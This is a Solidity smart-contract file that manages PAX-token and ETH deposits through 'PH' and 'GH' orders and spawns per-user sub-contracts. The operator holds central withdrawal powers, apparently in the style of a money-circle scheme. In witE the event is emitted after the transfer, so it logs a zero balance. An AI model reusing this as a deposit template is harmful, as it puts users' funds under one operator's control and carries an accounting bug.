pragma solidity ^0.5.16;

import "./SafeMath.sol";
import "./token.sol";

contract Global_VSC {

    constructor(address paxtoken) public{
        token = PAXImplementation(paxtoken);
        deployTime = now;
        tokenAdd = paxtoken;
        mAd = msg.sender;
        sAd = msg.sender;
        veAm = 1000000000000000; 
    }
     
    insurancesub public insurance;
    using SafeMath for uint256;
    
    PAXImplementation token;
    address public tokenAdd;
    address public mAd;
    address public sAd;
    address public lastContractAddress;
    address _contractaddress;
    address _phcontractaddress;
    address public insuranceAdd;

    uint256 public deployTime;
    uint256 public totalInsuranceSubContract;
    uint256 public totalPhSubContract;
    uint256 public veAm;

    Contracts[] public contractDatabase;
    
    PHcontracts[] public phcontractDatabase;
    
    GHamounts[] public ghamountDatabase;
    
    address[] public contracts;
    address[] public phcontracts;

    mapping (address => address) public insUserdetail;
    mapping (address => address) public phUserdetail;
    mapping (address => uint256) public getInsPosition;
    mapping (address => uint256) public getPhPosition;
    mapping (address => uint256) public balances;
    mapping (string => uint256) public ghOrderID;
    
    struct Contracts {
        address contractadd;
        address registeredUserAdd;
    }
    
    struct PHcontracts {
        address phcontractadd;
        address phregisteredUserAdd;
    }
    
    struct GHamounts {
        string ghorderid;
        uint256 ghtotalamount;
        address ghregisteredUserAdd;
    }
    
    event ContractGenerated (
        uint256 _ID,
        address _contractadd, 
        address indexed _userAddress
    );
    
    event PhContractGenerated (
        uint256 _phID,
        address _phcontractadd, 
        address indexed registeredUserAdd
    );
    
    event GhGenerated (
        uint256 _ghID,
        string indexed _ghorderid, 
        uint256 _ghtotalamount,
        address _ghuserAddress
    );

    event InsuranceFundUpdate(
        address indexed user, 
        uint256 insuranceAmount
    );
    
    event FundsTransfered(
        string indexed AmountType, 
        uint256 Amount
    );
    
    modifier onSad() {
        require(msg.sender == sAd, "only sAd");
        _;
    }
    
    modifier onMan() {
        require(msg.sender == mAd || msg.sender == sAd, "only mAn");
        _;
    }
    
    function adMan(address _manAd) public onSad {
        mAd = _manAd;
    
    }
    
    function remMan() public onSad {
        mAd = sAd;
    }
    
    function addInsuranceContract(address _insuranceContractAdd) public onSad{
        insuranceAdd = _insuranceContractAdd;
    }

    function () external payable {
        balances[msg.sender] += msg.value;
    }
    
    function feeC() public view returns (uint256) {
        return address(this).balance;
    }
    
    function witE() public onMan{
        msg.sender.transfer(address(this).balance);
        emit FundsTransfered("eth", address(this).balance);
    }
    
    function tokC() public view returns (uint256){
        return token.balanceOf(address(this));
    }

    function gethelp(address userAddress, uint256 tokens, string memory OrderID) public onMan {
        require(token.balanceOf(address(this)) >= tokens);
        token.transfer(userAddress, tokens);
        
        
        ghamountDatabase.push(GHamounts({
            ghorderid: OrderID,
            ghtotalamount : tokens,
            ghregisteredUserAdd : userAddress
        }));
        ghOrderID[OrderID] = ghamountDatabase.length - 1;
        emit FundsTransfered("Send GH", tokens);
    }
    

	function generateInsuranceOrder(address userAddress)
		public onMan
		payable
		returns(bool) 
	{
	   
		insurancesub c = (new insurancesub).value(msg.value)(tokenAdd, mAd, insuranceAdd,userAddress);
		_contractaddress = address(c);
		insUserdetail[userAddress] = _contractaddress;

		contractDatabase.push(Contracts({
            contractadd: _contractaddress,
            registeredUserAdd : userAddress
        }));
        
        getInsPosition[_contractaddress] = contractDatabase.length - 1;
        totalInsuranceSubContract = contractDatabase.length;
		contracts.push(address(c));
		lastContractAddress = address(c);
		
        emit ContractGenerated (
            contractDatabase.length - 1, 
            address(c),
            userAddress
        );
		return true;
	}
	
	
	

	function generatePHorder(address userAddress)
		public onMan
		payable
		returns(address newContract) 
	{
	   
		phsubcontract p = (new phsubcontract).value(msg.value)(tokenAdd, mAd, address(this) ,userAddress);
		_phcontractaddress = address(p);
		phUserdetail[userAddress] = _phcontractaddress;
	

		phcontractDatabase.push(PHcontracts({
            phcontractadd: _phcontractaddress,
            phregisteredUserAdd : userAddress
        }));
        
        getPhPosition[_phcontractaddress] = phcontractDatabase.length - 1;
        totalPhSubContract = phcontractDatabase.length;
		phcontracts.push(address(p));
		lastContractAddress = address(p);
		
        emit PhContractGenerated (
            phcontractDatabase.length - 1, 
            _phcontractaddress,
            userAddress
        );
		return address(p);
	}
	
	function getInsContractCount()
		public
		view
		returns(uint InsContractCount)
	{
		return contracts.length;
	}
	
	function getPhContractCount()
		public
		view
		returns(uint phContractCount)
	{
		return phcontracts.length;
	}
	

	function upVerAm(uint256 _nAm) public onSad{
	    veAm = _nAm;
	}


    function verifyAccount(address userAdd) public view returns(bool){
        if (balances[userAdd] >= veAm){
            return true;
        }
        else{
            return false;
        }
    }
    
    function contractAddress() public view returns(address){
        return address(this);
    }
 
}



contract phsubcontract {


    constructor(address tokenAdd, address mAd, address _mainAdd, address _userAddress) public payable{
      deployTime = now;
      mainconractAdd = _mainAdd;
      manAdd = mAd;
      tokenAddress = tokenAdd;
      userAdd = _userAddress;
      token = PAXImplementation(tokenAddress);
      Deployer = msg.sender;
    }
    
    address payable Deployer;
    address public manAdd;
    address public mainconractAdd;
    address public userAdd;
    uint256 public deployTime;
    address public tokenAddress;
    uint256 public withdrawedToken;
    PAXImplementation token;
    
    mapping (address => uint256) public balances;
    mapping (address => uint256) public tokenBalance;

    modifier onMan() {
        require(msg.sender == manAdd, "onMan");
        _;
      }
   
    function () external payable {
        balances[msg.sender] += msg.value;
        
    }
    
    function feeC() public view returns (uint256) {
            return address(this).balance;
    }
    
    function witAl() public onMan {
        withdrawedToken = token.balanceOf(address(this));
        token.transfer(mainconractAdd, token.balanceOf(address(this)));
    }
    

    function witE(uint256 amount) public onMan{
        require(address(this).balance >= amount);
        msg.sender.transfer(amount);
    }
    
    
    function checkUser(address _userAddress) public view returns(bool) {
        if(userAdd == _userAddress){
            return true;
        }
        else{
            return false;
        }
    }
    
    function tokC() public view returns (uint256){
       return token.balanceOf(address(this));
    }

   
     
}


contract insurancesub {


    constructor( address tokenAdd, address mAd, address _insuranceAdd, address _userAddress) public payable{
   
      deployTime = now;
      insuranceAdd = _insuranceAdd;
      manAdd = mAd;
      tokenAddress = tokenAdd;
      userAdd = _userAddress;
      token = PAXImplementation(tokenAddress);
      Deployer = msg.sender;
    }
    
    address payable Deployer;
    address public manAdd;
    address public insuranceAdd;
    address public userAdd;
    uint256 public deployTime;
    address public tokenAddress;
    uint256 public withdrawedToken;
    PAXImplementation token;
    
    mapping (address => uint256) public balances;
    mapping (address => uint256) public tokenBalance;

    modifier onMan() {
        require(msg.sender == manAdd, "onMan");
        _;
      }
   
    function () external payable {
        balances[msg.sender] += msg.value;
       
    }
    
    function feeC() public view returns (uint256) {
            return address(this).balance;
    }
    
    function witAl() public onMan {
        withdrawedToken = token.balanceOf(address(this));
        token.transfer(insuranceAdd, token.balanceOf(address(this)));
    }
    
    
    function witE(uint256 amount) public onMan{
        require(address(this).balance >= amount);
        msg.sender.transfer(amount);
    }
    

    
    function checkUser(address _userAddress) public view returns(bool) {
        if(userAdd == _userAddress){
            return true;
        }
        else{
            return false;
        }
    }
    
    function tokC() public view returns (uint256){
       return token.balanceOf(address(this));
    }
    
}